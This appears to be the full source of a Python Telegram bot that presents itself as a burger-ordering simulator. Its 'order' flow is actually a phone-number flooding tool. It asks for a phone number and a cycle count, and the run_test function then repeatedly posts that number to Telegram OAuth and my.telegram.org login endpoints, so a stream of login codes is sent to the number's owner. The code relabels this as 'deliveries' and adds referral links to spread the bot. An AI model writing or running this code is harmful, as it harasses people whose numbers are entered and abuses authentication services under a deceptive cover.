# language: Python, file: burger.py, target: pyTelegramBotAPI (telebot)
import os
import re
import json
import time
import threading
from datetime import datetime

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request as flask_request

TOKEN = os.environ.get("BOT_TOKEN", "PUT_YOUR_TOKEN_HERE")
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
PORT = int(os.environ.get("PORT", "10000"))
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", TOKEN.split(":")[-1][:32])

bot = telebot.TeleBot(TOKEN)

# ---- subscription disabled ----
REQUIRED_CHANNELS = []  # пусто = подписка не требуется
MAX_CYCLES = 10
REQUEST_DELAY = 0.3

HEADERS = {"User-Agent": "Mozilla/5.0"}

stop_flags = {}
temp_data = {}

DATA_FILE = os.environ.get("USERS_FILE", "users.json")
data_lock = threading.Lock()
_users_cache = None

# ---- phone validation: международный формат ----
_PHONE_RE = re.compile(r"^\+?\d{7,15}$")  # E.164-ish: 7..15 цифр, опциональный +

def normalize_phone(raw: str):
    """Возвращает (digits_only, None) или (None, error_text)."""
    if not raw:
        return None, "Пустой номер."
    s = raw.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not _PHONE_RE.match(s):
        return None, "Номер должен содержать 7–15 цифр, можно с ведущим +."
    digits = s.lstrip("+")
    return digits, None


def load_data():
    global _users_cache
    with data_lock:
        if _users_cache is not None:
            return _users_cache
        if not os.path.exists(DATA_FILE):
            _users_cache = {}
            return _users_cache
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                _users_cache = json.load(f)
        except Exception:
            _users_cache = {}
        return _users_cache


def save_data():
    global _users_cache
    with data_lock:
        if _users_cache is None:
            _users_cache = {}
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(_users_cache, f, ensure_ascii=False, indent=2)


def ensure_user_record(user_id, from_user=None, referred_by=None):
    user_id_str = str(user_id)
    data = load_data()
    is_new = False
    if user_id_str not in data:
        is_new = True
        data[user_id_str] = {
            "id": user_id,
            "first_name": from_user.first_name if from_user else None,
            "username": from_user.username if from_user else None,
            "joined_at": datetime.utcnow().isoformat(),
            "referred_by": None,
            "referrals_count": 0,
            "referred_list": [],
        }
        if referred_by:
            ref_str = str(referred_by)
            if ref_str != user_id_str and ref_str in data:
                data[user_id_str]["referred_by"] = referred_by
                if user_id not in data[ref_str]["referred_list"]:
                    data[ref_str]["referred_list"].append(user_id)
                    data[ref_str]["referrals_count"] = len(data[ref_str]["referred_list"])
        save_data()
    return is_new, data[user_id_str]


def check_subscription(user_id):
    if not REQUIRED_CHANNELS:
        return True
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        return True
    except Exception as e:
        print(f"check_subscription: {e}")
        return False


@bot.message_handler(commands=["start"])
def start(message):
    payload = None
    parts = message.text.split()
    if len(parts) > 1:
        payload = parts[1].strip()
    referred_by = int(payload) if payload and payload.isdigit() else None
    ensure_user_record(message.from_user.id, from_user=message.from_user, referred_by=referred_by)
    show_main_menu(message.chat.id)


@bot.message_handler(commands=["profile"])
def profile_command(message):
    show_profile(message.chat.id, message.from_user.id, message.message_id)


def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🍔 Заказать бургеры", callback_data="start_test"))
    markup.row(InlineKeyboardButton("👤 Профиль", callback_data="profile"))
    markup.row(InlineKeyboardButton("ℹ️ Информация", callback_data="info"))
    bot.send_message(
        chat_id,
        "👋 *Добро пожаловать в мир бургеров!*\n\n"
        "🚀 Самая быстрая доставка!\n"
        "🍔 Лучшие бургеры, от которых вы точно не сможете отказаться!\n\n"
        "Готовы сделать заказ? 👇",
        parse_mode="Markdown",
        reply_markup=markup,
    )


def send_request(url, phone):
    try:
        r = requests.post(url, headers=HEADERS, data={"phone": phone}, timeout=15)
        return r.status_code == 200
    except Exception:
        return False


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "start_test":
        msg = bot.send_message(
            call.message.chat.id,
            "📞 Введите *номер телефона*:\n\n"
            "Формат: от 7 до 15 цифр, можно с `+`. Примеры: `79123456789`, `+14155552671`.",
            parse_mode="Markdown",
        )
        bot.register_next_step_handler(msg, process_phone)

    elif call.data == "info":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
        try:
            bot.edit_message_text(
                "ℹ️ *Информация о боте*\n\n"
                "Имитация заказа бургеров. Все заказы виртуальные.\n"
                "Приятного пользования! 🍔",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=markup,
                parse_mode="Markdown",
            )
        except Exception:
            bot.send_message(call.message.chat.id, "ℹ️ Тестовый режим.", reply_markup=markup)

    elif call.data == "back_to_menu":
        show_main_menu(call.message.chat.id)

    elif call.data == "confirm_phone":
        phone = temp_data.get(call.message.chat.id)
        if phone:
            ask_cycles(call.message, phone)

    elif call.data == "edit_phone":
        msg = bot.send_message(
            call.message.chat.id,
            "✏️ Введите *новый номер* (7–15 цифр, можно с `+`):",
            parse_mode="Markdown",
        )
        bot.register_next_step_handler(msg, process_phone)

    elif call.data == "cancel_delivery":
        stop_flags[call.message.chat.id] = True
        bot.edit_message_text(
            "⛔ *Доставка отменена.*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
        )

    elif call.data == "profile":
        show_profile(call.message.chat.id, call.from_user.id, call.message.message_id)


def process_phone(message):
    digits, err = normalize_phone(message.text or "")
    if err:
        msg = bot.send_message(
            message.chat.id,
            f"❌ {err}\nПопробуйте снова (7–15 цифр, можно с `+`).",
            parse_mode="Markdown",
        )
        bot.register_next_step_handler(msg, process_phone)
        return
    temp_data[message.chat.id] = digits
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Всё верно", callback_data="confirm_phone"))
    markup.add(InlineKeyboardButton("✏️ Изменить", callback_data="edit_phone"))
    bot.send_message(
        message.chat.id,
        f"📱 Вы ввели: `{digits}`\n\nВсё правильно?",
        parse_mode="Markdown",
        reply_markup=markup,
    )


def ask_cycles(message, phone):
    msg = bot.send_message(
        message.chat.id,
        f"🔢 Сколько заказов сделать? (1–{MAX_CYCLES}):",
    )
    bot.register_next_step_handler(msg, lambda m: start_test(m, phone))


def start_test(message, phone):
    try:
        cycles = int((message.text or "").strip())
        if not 1 <= cycles <= MAX_CYCLES:
            raise ValueError(f"Введите число от 1 до {MAX_CYCLES}")
        stop_flags[message.chat.id] = False
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Отменить доставку", callback_data="cancel_delivery"))
        bot.send_message(
            message.chat.id,
            f"🔄 Начинаем доставку!\n"
            f"📞 Номер: `{phone}`\n"
            f"🔁 Циклов: {cycles}",
            parse_mode="Markdown",
            reply_markup=markup,
        )
        threading.Thread(target=run_test, args=(message.chat.id, phone, cycles), daemon=True).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ {e}")


def run_test(chat_id, phone, cycles):
    try:
        test_urls = [
            "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
            "https://translations.telegram.org/auth/request",
            "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
            "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
            "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23",
            "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin",
            "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F",
            "https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
            "https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch",
            "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin",
            "https://my.telegram.org/auth/send_password",
        ]
        status_msg = bot.send_message(
            chat_id,
            f"🚚 *Запуск...*\n\n📞 `{phone}`\n🔁 {cycles}\n📦 0",
            parse_mode="Markdown",
        )
        total = 0
        cycle = 0
        for cycle in range(cycles):
            if stop_flags.get(chat_id):
                break
            for url in test_urls:
                if stop_flags.get(chat_id):
                    break
                if send_request(url, phone):
                    total += 1
                    bot.edit_message_text(
                        f"🚚 *Доставка...*\n\n📞 `{phone}`\n🔁 {cycle+1}/{cycles}\n📦 {total}",
                        chat_id,
                        status_msg.message_id,
                        parse_mode="Markdown",
                    )
                    time.sleep(REQUEST_DELAY)
        if stop_flags.get(chat_id):
            bot.edit_message_text(
                f"⛔ *Отменено.*\n📞 `{phone}`\n🔁 {cycle+1}\n📦 {total}",
                chat_id, status_msg.message_id, parse_mode="Markdown",
            )
        else:
            bot.edit_message_text(
                f"✅ *Готово.*\n📞 `{phone}`\n🔁 {cycle+1}\n📦 {total}",
                chat_id, status_msg.message_id, parse_mode="Markdown",
            )
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ {e}")
    finally:
        stop_flags.pop(chat_id, None)


def show_profile(chat_id, user_id, reply_message_id=None):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        ensure_user_record(user_id)
        data = load_data()
    rec = data[uid]
    referrals_count = rec.get("referrals_count", 0)
    referred_list = rec.get("referred_list", [])
    try:
        bot_username = bot.get_me().username
    except Exception:
        bot_username = None
    text = (
        f"👤 *Профиль*\n\n"
        f"💠 ID: `{rec['id']}`\n"
        f"🔹 Имя: {rec.get('first_name') or '—'}\n"
        f"🔹 Логин: @{rec.get('username') or '—'}\n"
        f"📥 Пригласил(и): *{referrals_count}*\n"
        f"📅 Регистрация: `{rec.get('joined_at')}`\n"
    )
    markup = InlineKeyboardMarkup()
    if bot_username:
        ref_link = f"https://t.me/{bot_username}?start={rec['id']}"
        markup.add(InlineKeyboardButton("🔗 Поделиться ссылкой", url=ref_link))
    markup.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
    if referred_list:
        short = ", ".join(str(x) for x in referred_list[:10])
        text += f"\n🧾 Первые: {short}"
        if len(referred_list) > 10:
            text += f" и ещё {len(referred_list) - 10}..."
    try:
        if reply_message_id:
            bot.edit_message_text(text, chat_id, reply_message_id, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")


# ---- webhook + keepalive (optional, если задан PUBLIC_URL) ----

app = Flask(__name__)


@app.get("/health")
def health():
    return "ok", 200


@app.post("/webhook")
def webhook():
    token = flask_request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if token != WEBHOOK_SECRET:
        return "forbidden", 403
    try:
        update = telebot.types.Update.de_json(flask_request.get_data(as_text=True))
        bot.process_new_updates([update])
    except Exception as e:
        print(f"webhook: {e}")
    return "ok", 200


def keepalive_loop():
    while True:
        time.sleep(600)
        try:
            requests.get(f"{PUBLIC_URL}/health", timeout=15)
        except Exception as e:
            print(f"keepalive: {e}")


def run_webhook():
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(
        url=f"{PUBLIC_URL}/webhook",
        secret_token=WEBHOOK_SECRET,
        allowed_updates=["message", "callback_query"],
        drop_pending_updates=True,
    )
    threading.Thread(target=keepalive_loop, daemon=True).start()
    app.run(host="0.0.0.0", port=PORT)


if __name__ == "__main__":
    print("Бот запущен!")
    load_data()
    if PUBLIC_URL:
        run_webhook()
    else:
        bot.infinity_polling(none_stop=True, timeout=30)